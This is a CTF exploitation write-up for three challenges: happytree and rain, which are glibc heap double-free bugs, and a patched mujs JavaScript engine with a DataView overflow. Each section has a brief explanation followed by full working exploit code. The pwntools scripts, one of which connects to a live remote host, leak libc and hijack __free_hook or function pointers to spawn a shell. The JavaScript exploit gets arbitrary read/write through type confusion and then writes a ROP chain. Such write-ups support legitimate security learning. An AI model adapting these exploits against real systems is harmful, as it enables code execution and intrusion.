# happytree

The binary search tree implemented by C++, the vulnerability is that lchild and rchild are not cleared when creating a node, which can cause double free

```python
from pwn import *


p = process('./happytree')
elf = ELF('./happytree')
libc = ELF('./libc.so.6')


def Insert(data,con):
    p.sendlineafter('cmd> ',str(1))
    p.sendlineafter('data: ',str(data))
    p.sendafter('content: ',con)

def Del(data):
    p.sendlineafter('cmd> ',str(2))
    p.sendlineafter('data: ',str(data))

def Show(data):
    p.sendlineafter('cmd> ',str(3))
    p.sendlineafter('data: ',str(data))


Insert(0x46,'G')

for i in range(9):
    Insert(0x90+i,'A')

for i in range(8):
    Del(0x90+i)

for i in range(7):
    Insert(0x90+(6-i),'A')

Insert(0x80,'A')
Show(0x80)
p.recvuntil('content: ')
libc_base = u64(p.recv(6)+b'\x00\x00')-0x3ebd41
p.info('libc_base: '+hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
system = libc_base + libc.sym['system']


Insert(0x39,'G')
Insert(0x38,'G')
Insert(0x40,'G')
Insert(0x41,'G')
Del(0x40)
Insert(0x40,'A')
Del(0x40)
Del(0x41)
Del(0x38)
Insert(0x28,p64(0x41))
Del(0x41)
Del(0x28)
Insert(0x20,p64(free_hook-0x8))
Insert(0x21,b'/bin/sh\x00'+p64(system))
Del(0x21)

p.interactive()
```

# rain

The vulnerability is that the size is not controlled during realloc, and `realloc(0)` can be constructed to achieve free;

1. First create a chunk with the same size as the structure, then `realloc(0)` twice to achieve double free, and through `rain()+config()`, you can control the structure;
2. There is a table that stores uppercase letters in the structure, change its address to the address of the GOT table, and then `PrintInfo()` to leak libc;
3. Finally, change the `PrintInfo()` function pointer in the structure to `system`, and rewrite the beginning of the structure to `sh\x00` to get the shell

```python
from pwn import *

#context.log_level = 'debug'

p = remote('124.222.151.145','10002')
elf = ELF('./sample')
libc = ELF('./libc.so.6')


def config(frame):
    p.recvuntil('ch> ')
    p.sendline(str(1))
    p.recvuntil('FRAME> ')
    p.send(frame)

def PrintInfo():
    p.recvuntil('ch> ')
    p.sendline(str(2))

def rain():
    p.recvuntil('ch> ')
    p.sendline(str(3))


frame = p32(0x20)+p32(0x20)+p8(2)+p8(1)+p32(100)+p32(40000)+'B'*0x40
config(frame)
frame = p32(0x20)+p32(0x20)+p8(2)+p8(1)+p32(0)+p32(40000)
config(frame)
frame = p32(0x20)+p32(0x20)+p8(2)+p8(1)+p32(0)+p32(40000)
config(frame)
rain()
frame = p32(0x20)+p32(0x20)+p8(2)+p8(1)+p32(1)+p32(40000)
frame+= p32(0)+p32(0x40)+p8(2)+p8(1)+'P'*0x6+p64(0)+p64(0)+p32(1)+p32(40000)+p64(0x400E17)+p64(elf.got['atoi'])+p64(0xdeadbeef)
config(frame)
PrintInfo()
p.recvuntil('Table:            ')
libc_base = u64(p.recv(6)+b'\x00\x00')-libc.sym['atoi']
system = libc_base + libc.sym['system']
p.info('libc_base: '+hex(libc_base))
p.info('system: '+hex(system))
frame = p32(0x20)+p32(0x20)+p8(2)+p8(1)+p32(1)+p32(40000)
config(frame)
frame = p32(0x20)+p32(0x20)+p8(2)+p8(1)+p32(1)+p32(40000)
frame+= p32(0x6873)+p32(0x20)+p8(2)+p8(1)+'P'*0x6+p64(0)+p64(0)+p32(1)+p32(40000)+p64(system)+p64(0xdeadbeef)+p64(0xdeadbeef)
config(frame)
PrintInfo()


p.interactive()
```



# mujs

Added `dataview` class：

```c++
//jsvalue.h
enum js_Class {
	JS_COBJECT,
	JS_CARRAY,
	JS_CFUNCTION,
	JS_CSCRIPT, /* function created from global/eval code */
	JS_CCFUNCTION, /* built-in function */
	JS_CERROR,
	JS_CBOOLEAN,
	JS_CNUMBER,
	JS_CSTRING,
	JS_CREGEXP,
	JS_CDATE,
	JS_CMATH,
	JS_CJSON,
	JS_CARGUMENTS,
	JS_CITERATOR,
	JS_CUSERDATA,
	JS_CDATAVIEW,
};

.......
struct js_Object
{
    enum js_Class type;
	.......
		struct {
		    uint32_t length;
		    uint8_t* data;
		} dataview;
	} u;
	js_Object *gcnext; /* allocation list */
	js_Object *gcroot; /* scan list */
	int gcmark;
};
```

The vulnerability  is very straightforward, that is, the function `setUint8` can overflow; the expected solution is to overwrite the `type` of the next object to cause type confusion. 

Here is `Regexp`:

```C++
//jsvalue.h
struct js_Regexp
{
	void *prog;
	char *source;
	unsigned short flags;
	unsigned short last;
};
```

It can be seen that the first two fields of `Regexp` are function pointers. After changing its type to dataview, the address of prog will be regarded as the length of dataview, and then the source field is applied by `strdup`:

```C++
//jsregexp.c
static void js_newregexpx(js_State *J, const char *pattern, int flags, int is_clone)
{
	const char *error;
	js_Object *obj;
	Reprog *prog;
	int opts;

	obj = jsV_newobject(J, JS_CREGEXP, J->RegExp_prototype);

	opts = 0;
	if (flags & JS_REGEXP_I) opts |= REG_ICASE;
	if (flags & JS_REGEXP_M) opts |= REG_NEWLINE;

	prog = js_regcompx(J->alloc, J->actx, pattern, opts, &error);
	if (!prog)
		js_syntaxerror(J, "regular expression: %s", error);

	obj->u.r.prog = prog;
	obj->u.r.source = is_clone ? js_strdup(J, pattern) : escaperegexp(J, pattern);  <======
	obj->u.r.flags = flags;
	obj->u.r.last = 0;
	js_pushobject(J, obj);
}
```

Therefore, the idea is:

```javascript
var a = DataView(0x68);
var master = RegExp(PATH);
var b = DataView(0x68);
```

Change the type of `master` by `a.setUint8` to cause type confusion, and then use the `master` to control the data field of `b` to achieve arbitrary read and write.

exp：

```javascript
String.prototype.repeat=function(count){var str=''+this;count=+count;count=Math.floor(count);var maxCount=str.length*count;count=Math.floor(Math.log(count)/Math.log(2));while(count){str+=str;count--;}
str+=str.substring(0,maxCount-str.length);return str;}

PATH = '/'+'A'.repeat(0x5C)+'/CC'

var spray=[];
for(var i=0;i<1000;i++){
    spray.push('A'.repeat(0x68));
}

var a = DataView(0x68);
var master = RegExp(PATH);
var b = DataView(0x68);

a.setUint8(0x70,0x10)

master.edit = DataView.prototype.setUint32;
master.show = DataView.prototype.getUint32;

function read32(addr,master,b){
    master.edit(0x98,addr%0x100000000);
    master.edit(0x9c,addr/0x100000000);
    return b.getUint32(0);
}

function write32(addr,value,master,b){
    master.edit(0x98,addr%0x100000000);
    master.edit(0x9c,addr/0x100000000);
    b.setUint32(0,value);
}

var code_address = master.show(0x78)+master.show(0x7C)*0x100000000-0x480a0+0x1000
print('[+]code: 0x'+code_address.toString(16))
var libc_base = read32(code_address+0x46de8,master,b)+read32(code_address+0x46de8+4,master,b)*0x100000000-0x9d850
print('[+]libc: 0x'+libc_base.toString(16))
var stack = read32(libc_base+0x1ef2e0,master,b)+read32(libc_base+0x1ef2e4,master,b)*0x100000000
print('[+]stack: 0x'+stack.toString(16))


var mret = stack - 0x108
var pop_rdi = libc_base + 0x26b72
var sh = libc_base + 0x1b75aa
var system = libc_base + 0x55410
var ret = libc_base + 0x25679


print('[+]mret: 0x'+mret.toString(16))

function write64(addr,value,master,b){
    master.edit(0x98,addr%0x100000000);
    master.edit(0x9c,addr/0x100000000);
    b.setUint32(0,value%0x100000000);
    b.setUint32(4,value/0x100000000);
}

//rop
write64(mret,ret,master,b);
write64(mret+8,pop_rdi,master,b);
write64(mret+16,sh,master,b);
write64(mret+24,system,master,b);
```

